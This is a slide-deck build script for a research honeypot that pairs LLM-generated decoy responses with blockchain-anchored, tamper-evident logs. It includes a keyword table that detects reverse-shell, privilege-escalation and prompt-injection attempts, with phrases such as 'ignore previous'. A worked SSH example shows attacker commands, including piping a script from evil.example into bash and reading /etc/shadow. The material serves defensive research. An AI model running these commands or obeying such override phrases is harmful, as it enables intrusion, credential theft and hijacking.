divider(5, "Implementation", "The evidence pipeline",
        "What the collector does with every record, in order, in one request path.")

sl = new_slide()
title(sl, "Five steps on POST /api/log", kicker="Evidence pipeline")
pipe = [
    (1, "Classify intent", "Keyword matching over the raw payload assigns one of eight intent labels."),
    (2, "Hash", "SHA-256 over the record with keys sorted, so serialisation is canonical and the digest is reproducible."),
    (3, "Anchor", "The digest is written into the data field of an Ethereum transaction and mined."),
    (4, "Store", "The full record, its hash and the transaction hash go into a Redis list capped at 10,000 entries."),
    (5, "Stream", "The record is broadcast over WebSocket to every connected dashboard — no polling."),
]
y = BODY_TOP + 0.25
for n, h, s in pipe:
    rect(sl, M, y, CW, 0.78, fill=WHITE, line=PANEL_LN, radius=0.06)
    rect(sl, M + 0.22, y + 0.17, 0.44, 0.44, fill=ACCENT, shape=MSO_SHAPE.OVAL)
    text(sl, str(n), M + 0.22, y + 0.25, 0.44, 0.3, size=14, bold=True, color=WHITE,
         align=PP_ALIGN.CENTER)
    text(sl, h, M + 0.85, y + 0.25, 2.6, 0.3, size=14.5, bold=True, color=INK)
    text(sl, s, M + 3.6, y + 0.26, CW - 3.9, 0.4, size=12.5, color=BODY)
    y += 0.88
text(sl, "Anchoring sits inside the same request path as classification and storage — a record is never stored "
         "without having been committed on-chain first.", M, y + 0.12, CW, 0.35, size=12,
     color=MUTED, italic=True)

sl = new_slide()
title(sl, "Intent classification", "Eight labels, assigned by keyword match over the raw interaction",
      kicker="Evidence pipeline")
table(sl,
      ["Intent label", "Triggering indicators"],
      [["sql_injection", "SELECT · ' OR · UNION · DROP TABLE · 1=1"],
       ["privilege_escalation", "sudo · /etc/shadow · chmod 777 · passwd"],
       ["reverse_shell", "wget · curl · nc · bash -i · python -c · /bin/sh"],
       ["cryptomining", "xmrig · miner · monero · cryptonight · stratum"],
       ["prompt_injection", "ignore previous · jailbreak · pretend you · act as"],
       ["supply_chain", "git push · pipeline · jenkins · build trigger"],
       ["reconnaissance", "nmap · masscan · scan · ping sweep · port scan"],
       ["unknown", "everything else — deliberately kept as an explicit bucket"]],
      M, BODY_TOP + 0.2, 7.6, col_w=[2.2, 5.4], row_h=0.44, bsize=12)
rect(sl, M + 7.9, BODY_TOP + 0.2, CW - 7.9, 3.52, fill=PANEL, line=PANEL_LN, radius=0.05)
text(sl, "An honest note", M + 8.15, BODY_TOP + 0.45, 3.5, 0.3, size=14, bold=True, color=INK)
text(sl, "Classification is deterministic keyword matching, not a learned classifier. That is a deliberate "
         "trade: it is fast, fully explainable, and adds no model latency to the evidence path.\n\n"
         "Its limits are equally clear — obfuscated or encoded payloads fall into unknown. Keeping unknown as "
         "a first-class label rather than forcing a guess is what keeps the reported intent counts trustworthy.",
     M + 8.15, BODY_TOP + 0.88, CW - 8.45, 2.6, size=12, color=BODY, spacing=1.22)

# ====================================================== 06 BLOCKCHAIN / THREAT
divider(6, "Security", "Tamper-evident evidence",
        "The one property a compromised decoy cannot take away from you.")

sl = new_slide()
title(sl, "Anchoring pipeline", "Raw records stay off-chain; only the 256-bit digest is committed",
      kicker="Blockchain")
picture(sl, os.path.join(F3, "diag_pipeline.png"), M, BODY_TOP + 0.05, CW, 2.45)
bullets(sl, [
    ("Canonical serialisation. ", "Keys are sorted before hashing, so the same logical record always produces the same digest."),
    ("Digest only. ", "Attacker payloads never touch the chain — that keeps cost flat and avoids publishing captured data."),
    ("Self-transaction. ", "The anchor is a zero-value transaction from account[0] to itself, carrying the digest in the input data field."),
    ("Recoverable. ", "The digest can be read straight back out of the mined transaction — verified in the benchmark, not assumed."),
], M, 4.55, CW - 0.3, size=13.5, gap=0.6)

sl = new_slide()
title(sl, "Threat model", "The attacker owns the decoy host — what can they still not do?",
      kicker="Blockchain")
picture(sl, os.path.join(F3, "diag_threat.png"), M, BODY_TOP, 6.6, 4.5)
rect(sl, M + 6.85, BODY_TOP, CW - 6.85, 4.5, fill=PANEL, line=PANEL_LN, radius=0.05)
text(sl, "Assumed attacker capability", M + 7.1, BODY_TOP + 0.28, 4.5, 0.3, size=14,
     bold=True, color=RED)
bullets(sl, [
    "Full control of the decoy host and its local logs.",
    "Ability to edit or delete any stored record and its stored hash.",
], M + 7.1, BODY_TOP + 0.72, CW - 7.35, size=12, gap=0.6, dot=RED)
text(sl, "What remains out of reach", M + 7.1, BODY_TOP + 2.05, 4.5, 0.3, size=14,
     bold=True, color=TEAL)
bullets(sl, [
    "The digest already committed to the ledger, which lives outside the compromise boundary.",
    "Verification is therefore a comparison, not a matter of trust: re-hash the stored record and check it against the chain.",
    "A mismatch is positive proof of tampering; deletion of the record is equally visible, because the anchor still exists.",
], M + 7.1, BODY_TOP + 2.5, CW - 7.35, size=12, gap=0.62, dot=TEAL)

sl = new_slide()
title(sl, "Verification procedure", "Independently reproducible with verify_integrity.py",
        kicker="Blockchain")
vsteps = [
    (1, "Fetch", "Read the stored record back from Redis, together with its recorded transaction hash."),
    (2, "Re-hash", "Recompute SHA-256 over the record using the same canonical key ordering."),
    (3, "Read the chain", "Pull the transaction by hash and extract the digest from its input data field."),
    (4, "Compare", "Equal digests confirm integrity; any difference is proof the stored record changed after anchoring."),
    (5, "Negative control", "The script then mutates a copy of the same record and shows the digest diverges — the check genuinely discriminates."),
]
y = BODY_TOP + 0.3
for n, h, s in vsteps:
    rect(sl, M, y, CW * 0.62, 0.75, fill=WHITE, line=PANEL_LN, radius=0.06)
    rect(sl, M + 0.2, y + 0.16, 0.42, 0.42, fill=TEAL, shape=MSO_SHAPE.OVAL)
    text(sl, str(n), M + 0.2, y + 0.235, 0.42, 0.3, size=13.5, bold=True, color=WHITE,
         align=PP_ALIGN.CENTER)
    text(sl, h, M + 0.8, y + 0.13, 2.3, 0.3, size=13, bold=True, color=INK)
    text(sl, s, M + 0.8, y + 0.42, CW * 0.62 - 1.05, 0.3, size=11, color=BODY)
    y += 0.85
stat(sl, M + CW * 0.66, BODY_TOP + 0.3, CW * 0.34, 1.35,
     "%.0f%%" % BC["tamper_detection"]["detection_rate_pct"], "Tamper detection",
     "%d/%d trials, %d false positives" % (BC["tamper_detection"]["detected"],
                                           BC["tamper_detection"]["trials"],
                                           BC["tamper_detection"]["false_positives"]), TEAL)
stat(sl, M + CW * 0.66, BODY_TOP + 1.85, CW * 0.34, 1.35,
     "%.4f ms" % BC["verification_latency_ms"]["mean_ms"], "Verification cost",
     "mean over %d verifications" % BC["verification_latency_ms"]["n"], ACCENT, vsize=25)
stat(sl, M + CW * 0.66, BODY_TOP + 3.4, CW * 0.34, 1.15,
     "yes", "Digest recoverable on-chain",
     "read back from tx input data", INK, vsize=25)

# ============================================================== 07 DASHBOARD
divider(7, "Operation", "The live dashboard",
        "Attacks appear as they happen, pushed over WebSocket.")

sl = new_slide()
title(sl, "Analyst view", kicker="Dashboard")
picture(sl, os.path.join(F2, "dashboard.png"), M, BODY_TOP - 0.05, 8.5, 4.9)
rect(sl, M + 8.75, BODY_TOP - 0.05, CW - 8.75, 4.9, fill=PANEL, line=PANEL_LN, radius=0.05)
text(sl, "What it shows", M + 9.0, BODY_TOP + 0.2, 3.2, 0.3, size=14, bold=True, color=INK)
bullets(sl, [
    "Headline counters: attacks intercepted, unique attacker IPs, services under attack, share of evidence anchored on-chain.",
    "Attack activity over the last 24 hours.",
    "Intent breakdown, colour-coded by label.",
    "Service exposure — which decoy and port is being hit hardest.",
    "Top threat actors, ranked by volume.",
    "Live feed holding the last 200 events, each marked anchored or local.",
    "Status lamps for feed and chain anchoring.",
], M + 9.0, BODY_TOP + 0.62, CW - 9.05, size=10.5, pad=0.15)

sl = new_slide()
title(sl, "Worked example", "An SSH intrusion, end to end", kicker="Dashboard")
rows = [
    ("Attacker runs ssh root@host -p 2222", "proxy", "Connection logged before the decoy responds", "reconnaissance"),
    ("Submits root : password123", "shadow-shell", "Accepted; credential pair captured", "unknown"),
    ("Runs sudo cat /etc/shadow", "shadow-shell", "Fake shadow file returned from the static table", "privilege_escalation"),
    ("Runs wget http://evil.example/miner.sh | bash", "shadow-shell", "Model-generated download output", "reverse_shell"),
    ("Runs ./xmrig -o stratum+tcp://pool", "shadow-shell", "Model-generated miner startup output", "cryptomining"),
]
table(sl, ["Attacker action", "Handled by", "System response", "Classified intent"],
      [list(r) for r in rows], M, BODY_TOP + 0.3, CW,
      col_w=[4.2, 2.0, 4.2, 2.4], row_h=0.62, bsize=12)
text(sl, "Every one of these five rows was hashed, anchored on-chain, stored in Redis and pushed to the "
         "dashboard before the attacker's next keystroke — the anchor costs %.2f ms."
     % BC["anchor_latency_ms"]["mean_ms"],
     M, BODY_TOP + 4.25, CW, 0.5, size=13, color=INK, spacing=1.25)

# ============================================================ 08 EVALUATION
divider(8, "Results", "Evaluation",
        "Four independent metrics against a real-payload corpus, plus a live blockchain benchmark.")

sl = new_slide()
title(sl, "Methodology", "Four measurements instead of one unexplained score", kicker="Evaluation")
meth = [
    (1, "Sequential latency", "Static fast path versus model-backed path, one request at a time. "
        "%d and %d trials; mean, median and spread all reported."
        % (EV["latency"]["static"]["n"], EV["latency"]["dynamic"]["n"])),
    (2, "Concurrent throughput", "%d simultaneous sessions, measuring sustained request rate under "
        "concurrency rather than one-at-a-time latency."
        % EV["concurrent_throughput"]["concurrency_level"]),
    (3, "Response diversity", "Fraction of distinct outputs across all %s payloads, per service — "
        "a direct proxy for resistance to signature-based fingerprinting." % f"{DS_N:,}"),
    (4, "LLM-judge realism", "An independent %s rates %d sampled responses 1–5 on how convincingly they "
        "imitate a real system." % (EV["config"]["judge_model"], EV["llm_judge_realism"]["n_scored"])),
]
y = BODY_TOP + 0.3
for n, h, s in meth:
    rect(sl, M, y, CW, 0.95, fill=WHITE, line=PANEL_LN, radius=0.06)
    rect(sl, M + 0.22, y + 0.26, 0.44, 0.44, fill=ACCENT, shape=MSO_SHAPE.OVAL)
    text(sl, str(n), M + 0.22, y + 0.34, 0.44, 0.3, size=14, bold=True, color=WHITE,
         align=PP_ALIGN.CENTER)
    text(sl, h, M + 0.88, y + 0.2, 3.2, 0.3, size=14.5, bold=True, color=INK)
    text(sl, s, M + 0.88, y + 0.52, CW - 1.2, 0.4, size=11.5, color=BODY)
    y += 1.05
text(sl, "The judge is an automated proxy metric, not a human-subject study. The exact prompt lives in "
         "evaluate.py and the caveat is carried in the paper's limitations section.",
     M, y + 0.12, CW, 0.4, size=11.5, color=AMBER, italic=True)

sl = new_slide()
title(sl, "The dataset", "%s real, publicly documented attack payloads — none written by hand or by a model"
      % f"{DS_N:,}", kicker="Evaluation")
table(sl, ["Service", "Payloads", "Provenance"],
      [["ssh", f"{DS_BY_SVC['ssh']:,}", "SecLists command-injection corpus (commix-derived) + command-injection-payload-list"],
       ["sql", f"{DS_BY_SVC['sql']:,}", "SecLists SQLi corpus — generic, polyglot and sqlmap risk-classified boolean/error/time-based"],
       ["api", f"{DS_BY_SVC['api']:,}", "PayloadsAllTheThings — prompt injection, SSRF, XXE, Log4Shell — plus SecLists XXE fuzzing"],
       ["web3", f"{DS_BY_SVC['web3']:,}", "Real Ethereum JSON-RPC methods per the published spec — the call itself is the attack"],
       ["cicd", f"{DS_BY_SVC['cicd']:,}", "Real Jenkins remote-API endpoints and techniques from Jenkins security advisories"]],
      M, BODY_TOP + 0.3, CW, col_w=[1.3, 1.4, 9.1], row_h=0.55, bsize=12)
rect(sl, M, BODY_TOP + 3.7, CW, 1.35, fill=PANEL, line=PANEL_LN, radius=0.05)
text(sl, "Why web3 and cicd are small on purpose", M + 0.3, BODY_TOP + 3.92, 6.0, 0.3,
     size=13, bold=True, color=INK)
text(sl, "Their real attack surface is a small, finite set of documented API methods and endpoints — not an open "
         "space of injection strings. Padding them to match ssh or sql would mean fabricating payloads instead of "
         "using real ones. Every entry carries a source field for provenance, and fetched corpora are cached locally "
         "so the generator still works offline.",
     M + 0.3, BODY_TOP + 4.28, CW - 0.6, 0.8, size=11.5, color=BODY, spacing=1.2)

# ---- results: latency
sl = new_slide()
title(sl, "Latency", "The tiering does what it was designed to do", kicker="Results")
picture(sl, os.path.join(F2, "fig2_latency.png"), M, BODY_TOP, 6.0, 4.5)
stat(sl, M + 6.4, BODY_TOP + 0.05, (CW - 6.4) / 2 - 0.1, 1.35,
     "%.1f ms" % (EV["latency"]["static"]["mean_s"] * 1000), "Static path (mean)",
     "median %.1f ms · n=%d" % (EV["latency"]["static"]["median_s"] * 1000,
                                EV["latency"]["static"]["n"]), TEAL, vsize=26)
stat(sl, M + 6.4 + (CW - 6.4) / 2 + 0.1, BODY_TOP + 0.05, (CW - 6.4) / 2 - 0.1, 1.35,
     "%.2f s" % EV["latency"]["dynamic"]["mean_s"], "Model path (mean)",
     "median %.2f s · n=%d" % (EV["latency"]["dynamic"]["median_s"],
                               EV["latency"]["dynamic"]["n"]), AMBER, vsize=26)
bullets(sl, [
    ("Three orders of magnitude apart. ", "The static table answers in %.1f ms; the model path averages %.2f s."
     % (EV["latency"]["static"]["mean_s"] * 1000, EV["latency"]["dynamic"]["mean_s"])),
    ("Median well below mean. ", "%.2f s versus %.2f s — the distribution has a long right tail (max %.2f s), "
     "typical of a hosted API under variable load."
     % (EV["latency"]["dynamic"]["median_s"], EV["latency"]["dynamic"]["mean_s"],
        EV["latency"]["dynamic"]["max_s"])),
    ("Why it still works. ", "The commands an attacker types first are exactly the ones in the static table, "
     "so the slow path is hit only once the session is already committed."),
], M + 6.4, BODY_TOP + 1.7, CW - 6.5, size=12, gap=0.85)

sl = new_slide()
title(sl, "Throughput", "Honest numbers, including the ones that are not flattering", kicker="Results")
picture(sl, os.path.join(F2, "fig3_throughput.png"), M, BODY_TOP, 5.9, 4.5)
table(sl, ["Path", "Throughput"],
      [["Static fast path", "%s req/s" % f"{EV['throughput_rps']['static']:,.0f}"],
       ["Model path, sequential", "%.2f req/s" % EV["throughput_rps"]["dynamic_sequential"]],
       ["Model path, %d concurrent" % EV["concurrent_throughput"]["concurrency_level"],
        "%.2f req/s" % EV["concurrent_throughput"]["throughput_rps"]],
       ["Per-request latency at that concurrency", "%.2f s mean" % EV["concurrent_throughput"]["per_request_latency"]["mean_s"]]],
      M + 6.3, BODY_TOP + 0.1, CW - 6.3, col_w=[3.6, 2.2], row_h=0.5, bsize=12)
rect(sl, M + 6.3, BODY_TOP + 2.75, CW - 6.3, 2.2, fill=RGBColor(0xFF, 0xFB, 0xEB),
     line=RGBColor(0xF2, 0xE3, 0xB8), radius=0.05)
text(sl, "A bug we found and reported", M + 6.55, BODY_TOP + 2.97, 5.0, 0.3, size=13,
     bold=True, color=AMBER)
text(sl, "An earlier revision of this work reported ~800 req/s under concurrency. That figure was wrong: the "
         "concurrency benchmark reused payloads the diversity pass had already sent, so every request was a "
         "Redis cache hit and the number measured cache round-trip, not model throughput.\n\n"
         "The fix appends a fresh UUID to each payload immediately before firing. All prior concurrent-throughput "
         "figures are withdrawn; the numbers above are the corrected ones.",
     M + 6.55, BODY_TOP + 3.33, CW - 6.8, 1.5, size=10.5, color=BODY, spacing=1.18)

sl = new_slide()
title(sl, "Response diversity", "Resistance to signature-based fingerprinting, per service",
      kicker="Results")
picture(sl, os.path.join(F2, "fig4_diversity.png"), M, BODY_TOP, 5.9, 4.5)
dv = EV["response_diversity_by_service"]
table(sl, ["Service", "Payloads", "Distinct", "Unique"],
      [[k, f"{dv[k]['n']:,}", f"{dv[k]['distinct']:,}", "%.1f%%" % (dv[k]["uniqueness_ratio"] * 100)]
       for k in ["ssh", "sql", "api", "web3", "cicd"]],
      M + 6.3, BODY_TOP + 0.1, CW - 6.3, col_w=[1.5, 1.5, 1.4, 1.4], row_h=0.44, bsize=12)
bullets(sl, [
    ("SQL is near-perfect. ", "%.1f%% distinct across %d real injection payloads."
     % (dv["sql"]["uniqueness_ratio"] * 100, dv["sql"]["n"])),
    ("SSH holds up at scale. ", "%.1f%% distinct across %s payloads — the largest slice by far."
     % (dv["ssh"]["uniqueness_ratio"] * 100, f"{dv['ssh']['n']:,}")),
    ("API is the weak point. ", "%.0f%%. Raw XXE and JNDI payloads collapse into a generic error reply. "
     "This is the clearest actionable finding in the evaluation."
     % (dv["api"]["uniqueness_ratio"] * 100)),
], M + 6.3, BODY_TOP + 2.9, CW - 6.4, size=12, gap=0.62)

sl = new_slide()
title(sl, "Realism", "Scored by an independent %s" % EV["config"]["judge_model"], kicker="Results")
picture(sl, os.path.join(F2, "fig5_realism.png"), M, BODY_TOP, 5.9, 4.5)
stat(sl, M + 6.3, BODY_TOP + 0.05, CW - 6.4, 1.3,
     "%.2f / 5" % EV["llm_judge_realism"]["mean_score_1to5"], "Mean realism score",
     "σ = %.2f over %d judged responses" % (EV["llm_judge_realism"]["stdev"],
                                            EV["llm_judge_realism"]["n_scored"]), ACCENT, vsize=27)
d = EV["llm_judge_realism"]["distribution"]
text(sl, "Score distribution", M + 6.3, BODY_TOP + 1.6, 4.0, 0.3, size=13, bold=True, color=INK)
yy = BODY_TOP + 2.0
for k in ["5", "4", "3", "2", "1"]:
    v = d.get(k, 0)
    text(sl, k, M + 6.35, yy, 0.3, 0.28, size=11.5, bold=True, color=MUTED)
    barw = (CW - 7.6) * (v / max(1, EV["llm_judge_realism"]["n_scored"]))
    rect(sl, M + 6.7, yy + 0.05, CW - 7.6, 0.18, fill=RGBColor(0xEC, 0xEF, 0xF6),
         shape=MSO_SHAPE.RECTANGLE)
    if v:
        rect(sl, M + 6.7, yy + 0.05, max(barw, 0.04), 0.18,
             fill=TEAL if k == "5" else (RED if k in ("1", "2") else ACCENT),
             shape=MSO_SHAPE.RECTANGLE)
    text(sl, str(v), M + CW - 0.75, yy, 0.5, 0.28, size=11, color=BODY, align=PP_ALIGN.RIGHT)
    yy += 0.38
text(sl, "Bimodal, not uniform: %d of %d responses are judged indistinguishable from real output, while %d fail "
         "outright — and those failures cluster on the api service's XXE and JNDI payloads. The mean hides that; "
         "the distribution does not."
     % (d.get("5", 0), EV["llm_judge_realism"]["n_scored"], d.get("1", 0) + d.get("2", 0)),
     M + 6.3, yy + 0.15, CW - 6.4, 0.9, size=11.5, color=BODY, spacing=1.2)

# ---- blockchain results
sl = new_slide()
title(sl, "Blockchain benchmark", "%d anchors measured against the live stack — Ganache %s, chain %s"
      % (BC["anchor_latency_ms"]["n"], BC["meta"]["ganache_client"].split("/")[1], BC["meta"]["chain_id"]),
      kicker="Results")
cards = [
    ("%.2f ms" % BC["anchor_latency_ms"]["mean_ms"], "Mean anchor latency",
     "median %.2f · p95 %.2f · p99 %.2f ms" % (BC["anchor_latency_ms"]["median_ms"],
                                               BC["anchor_latency_ms"]["p95_ms"],
                                               BC["anchor_latency_ms"]["p99_ms"]), ACCENT),
    ("%.4f ms" % BC["baseline_hash_latency_ms"]["mean_ms"], "Baseline SHA-256 only",
     "hashing is effectively free; the chain write is the cost", TEAL),
    ("%s" % f"{int(round(BC['gas']['mean_gas'])):,}", "Gas per anchor",
     "range %s–%s · %.2e ETH at %d gwei" % (f"{BC['gas']['min_gas']:,}", f"{BC['gas']['max_gas']:,}",
                                            BC["gas"]["mean_cost_eth"],
                                            BC["meta"]["gas_price_wei"] // 10**9), AMBER),
    ("%d / %d" % (BC["anchored_success"]["anchored_ok"], BC["anchored_success"]["attempted"]),
     "Anchoring success", "%.0f%% — every event committed on-chain" % BC["anchored_success"]["success_rate_pct"], TEAL),
    ("%.2f / %.2f" % (BC["throughput_rps"]["sequential_anchored"], BC["throughput_rps"]["concurrent_anchored"]),
     "Events/s sequential / concurrent",
     "at concurrency %d" % BC["throughput_rps"]["concurrency_level"], ACCENT),
    ("%d / %d" % (BC["tamper_detection"]["detected"], BC["tamper_detection"]["trials"]),
     "Tamper trials detected", "%.0f%% detection, %d false positives"
     % (BC["tamper_detection"]["detection_rate_pct"], BC["tamper_detection"]["false_positives"]), TEAL),
]
x, yv = M, BODY_TOP + 0.2
for i, (v, lb, nt, c) in enumerate(cards):
    col, row = i % 3, i // 3
    stat(sl, M + col * (CW / 3 + 0.06), yv + row * 1.6, CW / 3 - 0.12, 1.42, v, lb, nt, c, vsize=24)
text(sl, "Gas is flat at the 21,000-unit base-transaction floor: the digest rides in the transaction's input "
         "data, so anchoring cost does not grow with the size of the record being protected.",
     M, yv + 3.35, CW, 0.5, size=12.5, color=INK, spacing=1.2)

sl = new_slide()
title(sl, "Blockchain results in detail", kicker="Results")
w3 = (CW - 0.5) / 3
for i, (p, cap) in enumerate([
        (os.path.join(F3, "fig_latency.png"), "Anchor latency distribution"),
        (os.path.join(F3, "fig_gas.png"), "Gas consumed per anchor"),
        (os.path.join(F3, "fig_tamper.png"), "Tamper-detection outcome")]):
    picture(sl, p, M + i * (w3 + 0.25), BODY_TOP + 0.35, w3, 3.25, caption=cap)
text(sl, "All three charts are generated directly from blockchain_results.json, which is written by "
         "benchmark_blockchain.py running against the live Ganache + FastAPI + Redis stack. No value in this "
         "deck was typed by hand.",
     M, 5.95, CW, 0.6, size=12.5, color=BODY, align=PP_ALIGN.CENTER, spacing=1.2)

sl = new_slide()
title(sl, "The optimisation pass", "Three changes, measured before and after", kicker="Results")
bullets(sl, [
    ("Connection pooling. ", "A persistent HTTP session to the model API, removing per-call TLS handshake cost."),
    ("Tuned generation length. ", "Shorter maximum output — terminal text is terse, and short generations return faster."),
    ("Widened static dictionary. ", "More common commands answered at tier 1, so fewer sessions reach the model at all."),
], M, BODY_TOP + 0.3, CW - 0.3, size=14.5, gap=0.72)
rect(sl, M, BODY_TOP + 2.0, CW / 2 - 0.15, 1.55, fill=RGBColor(0xEE, 0xFB, 0xF7),
     line=RGBColor(0xC8, 0xEA, 0xE1), radius=0.05)
text(sl, "≈ 3× faster", M + 0.35, BODY_TOP + 2.28, 4.0, 0.5, size=26, bold=True, color=TEAL)
text(sl, "on the model-backed path, measured before and after",
     M + 0.35, BODY_TOP + 2.86, CW / 2 - 0.8, 0.5, size=12, color=BODY)
rect(sl, M + CW / 2 + 0.1, BODY_TOP + 2.0, CW / 2 - 0.15, 1.55,
     fill=RGBColor(0xFF, 0xFB, 0xEB), line=RGBColor(0xF2, 0xE3, 0xB8), radius=0.05)
text(sl, "at a small realism cost", M + CW / 2 + 0.45, BODY_TOP + 2.26, 5.0, 0.5,
     size=20, bold=True, color=AMBER)
text(sl, "Shorter responses score marginally lower with the judge. Reported rather than hidden — the "
         "trade is deliberate and documented in BENCHMARK_REPORT.md.",
     M + CW / 2 + 0.45, BODY_TOP + 2.76, CW / 2 - 0.8, 0.7, size=12, color=BODY, spacing=1.15)
text(sl, "The same report also documents the withdrawn concurrency figure. Recording a benchmark that got "
         "worse, and a number that turned out to be wrong, is part of the contribution.",
     M, BODY_TOP + 3.85, CW, 0.5, size=12.5, color=MUTED, italic=True)

sl = new_slide()
title(sl, "Positioning against prior work", kicker="Results")
picture(sl, os.path.join(F2, "tab_compare.png"), M, BODY_TOP - 0.05, CW, 2.35, frame=True)
picture(sl, os.path.join(F3, "tab_compare.png"), M, BODY_TOP + 2.35, CW, 2.5, frame=True)
text(sl, "Top: deception capability against comparable honeypot systems.   ·   "
         "Bottom: tamper-evidence properties against prior log-integrity approaches.",
     M, 6.55, CW, 0.4, size=11.5, color=MUTED, align=PP_ALIGN.CENTER, italic=True)

# ========================================================== 09 LIMITATIONS
divider(9, "Discussion", "Limitations & honest framing",
        "What these numbers do not claim.")

sl = new_slide()
title(sl, "What this evaluation does not claim", kicker="Limitations")
lim = [
    ("Ganache mines instantly. ", "The %.2f ms anchor latency contains no public-network confirmation wait. "
     "The contribution is the pipeline, the threat model and the %.0f%% tamper detection — all of which transfer "
     "unchanged to a batched public or permissioned deployment, where anchoring cost is amortised over many records."
     % (BC["anchor_latency_ms"]["mean_ms"], BC["tamper_detection"]["detection_rate_pct"])),
    ("The judge is a model, not a person. ", "Realism is scored by a second language model. It is a reproducible "
     "proxy metric; it is not a human-subject study, and a skilled human analyst may well detect the decoy where "
     "the judge does not."),
    ("No live attacker traffic was captured. ", "Everything reported here was measured against a real-payload "
     "corpus in a lab. Exposing decoy ports to the internet is a deliberate operational decision, with legal and "
     "provider-policy implications, and was intentionally left to whoever deploys the system."),
    ("Classification is keyword-based. ", "Fast and explainable, but obfuscated or encoded payloads land in "
     "unknown rather than a specific label."),
    ("Concurrency is limited by the hosted API. ", "At %d concurrent sessions the system sustains %.2f req/s on the "
     "model path — an upstream API constraint, not a design ceiling of the pipeline."
     % (EV["concurrent_throughput"]["concurrency_level"], EV["concurrent_throughput"]["throughput_rps"])),
]
bullets(sl, lim, M, BODY_TOP + 0.25, CW - 0.3, size=13.5, pad=0.34)

# ========================================================= 10 RESEARCH OUTPUT
sl = new_slide()
title(sl, "Research output", "Two distinct IEEE-format papers, both built from measured data",
      kicker="Deliverables")
papers = [
    ("Paper 2 — Deception", "AI-driven multi-service deception with a tiered response engine",
     ["Source of numbers: evaluation_results.json",
      "%s real payloads across five services" % f"{DS_N:,}",
      "Realism %.2f/5 · SQL diversity %.1f%%" % (EV["llm_judge_realism"]["mean_score_1to5"],
                                                 dv["sql"]["uniqueness_ratio"] * 100),
      "IEEEtran LaTeX + DOCX + PDF"], ACCENT),
    ("Paper 3 — Tamper-evidence", "Blockchain-anchored audit trail for honeypot forensics",
     ["Source of numbers: blockchain_results.json",
      "%d anchors · %d tamper trials" % (BC["anchor_latency_ms"]["n"], BC["tamper_detection"]["trials"]),
      "Anchor %.2f ms · detection %.0f%%" % (BC["anchor_latency_ms"]["mean_ms"],
                                             BC["tamper_detection"]["detection_rate_pct"]),
      "7 pages, compiles clean"], TEAL),
]
x = M
for h, s, its, c in papers:
    w = CW / 2 - 0.15
    rect(sl, x, BODY_TOP + 0.2, w, 3.3, fill=WHITE, line=PANEL_LN, radius=0.05)
    rect(sl, x, BODY_TOP + 0.2, w, 0.07, fill=c, shape=MSO_SHAPE.RECTANGLE)
    text(sl, h, x + 0.3, BODY_TOP + 0.5, w - 0.6, 0.35, size=17, bold=True, color=INK)
    text(sl, s, x + 0.3, BODY_TOP + 0.92, w - 0.6, 0.6, size=12.5, color=MUTED, spacing=1.15)
    bullets(sl, its, x + 0.3, BODY_TOP + 1.66, w - 0.7, size=11.5, gap=0.42, dot=c)
    x += w + 0.3
rect(sl, M, BODY_TOP + 3.75, CW, 1.15, fill=PANEL, line=PANEL_LN, radius=0.05)
text(sl, "The two papers share ≈1% 6-gram overlap — confined to the author list and shared citations — so they "
         "are genuinely separate contributions rather than one result split in two. Both rebuild end to end from "
         "the raw JSON: re-run the benchmark and every figure, table and in-text number refreshes consistently.",
     M + 0.3, BODY_TOP + 4.0, CW - 0.6, 0.8, size=12.5, color=BODY, spacing=1.22)

sl = new_slide()
title(sl, "Technology stack", kicker="Deliverables")
stack = [
    ("Deception layer", ["Python asyncio + aiohttp", "asyncssh — real SSH server", "FastAPI — four HTTP decoys"], ACCENT),
    ("Intelligence layer", ["OpenRouter hosted LLM API", EV["config"]["engine_model"], "Redis response cache"], AMBER),
    ("Evidence layer", ["SHA-256 canonical hashing", "Web3.py + Ganache chain", "Redis record store"], TEAL),
    ("Presentation layer", ["React dashboard", "WebSocket live push", "Docker Compose — 10 services"], ACCENT),
]
x = M
for h, its, c in stack:
    w = CW / 4 - 0.15
    rect(sl, x, BODY_TOP + 0.5, w, 2.6, fill=WHITE, line=PANEL_LN, radius=0.05)
    rect(sl, x, BODY_TOP + 0.5, w, 0.07, fill=c, shape=MSO_SHAPE.RECTANGLE)
    text(sl, h, x + 0.28, BODY_TOP + 0.8, w - 0.5, 0.35, size=14, bold=True, color=INK)
    bullets(sl, its, x + 0.28, BODY_TOP + 1.35, w - 0.55, size=11.5, dot=c, pad=0.25)
    x += w + 0.2
text(sl, "Evaluation and paper toolchain:  evaluate.py · benchmark_blockchain.py · generate_dataset.py · "
         "matplotlib figures · headless-Chrome diagram rendering · IEEEtran LaTeX via tectonic",
     M, BODY_TOP + 3.5, CW, 0.5, size=12, color=MUTED, align=PP_ALIGN.CENTER)

sl = new_slide()
title(sl, "Reproducing everything", "Every artefact in this deck rebuilds from source", kicker="Deliverables")
runs = [
    (1, "Bring the stack up", "docker compose up --build   —   ten containers on honeypot-net"),
    (2, "Rebuild the dataset", "python3 generate_dataset.py   —   refetches real payload corpora (cached offline)"),
    (3, "Run the evaluation", "python3 evaluate.py   —>   evaluation_results.json"),
    (4, "Run the chain benchmark", "python3 benchmark_blockchain.py   —>   blockchain_results.json"),
    (5, "Verify integrity independently", "python3 verify_integrity.py   —   re-hash, compare on-chain, show a tampered copy diverging"),
    (6, "Rebuild the papers", "generate_figures.py · build_tables.py · render.py · build_latex.py · tectonic paper.tex"),
    (7, "Rebuild this deck", "presentation/build_ppt.py   —   reads the same JSON files"),
]
y = BODY_TOP + 0.25
for n, h, s in runs:
    rect(sl, M, y, CW, 0.6, fill=WHITE, line=PANEL_LN, radius=0.06)
    rect(sl, M + 0.2, y + 0.12, 0.36, 0.36, fill=INK, shape=MSO_SHAPE.OVAL)
    text(sl, str(n), M + 0.2, y + 0.175, 0.36, 0.28, size=12, bold=True, color=WHITE,
         align=PP_ALIGN.CENTER)
    text(sl, h, M + 0.74, y + 0.17, 3.1, 0.3, size=13, bold=True, color=INK)
    text(sl, s, M + 3.95, y + 0.185, CW - 4.25, 0.3, size=11, color=BODY, font="Courier New")
    y += 0.665
text(sl, "Nothing in the papers or this deck is hand-typed: re-running the benchmarks refreshes every figure, "
         "table and in-text number consistently.", M, y + 0.14, CW, 0.4, size=12,
     color=MUTED, italic=True)

sl = new_slide()
title(sl, "Future work", kicker="Discussion")
fut = [
    ("Fix the api decoy's weak spot", "Add XML-parser and JNDI-aware exemplars to the oracle-ai system prompt, "
     "then re-measure diversity — currently %.0f%%, the lowest of the five services."
     % (dv["api"]["uniqueness_ratio"] * 100), AMBER),
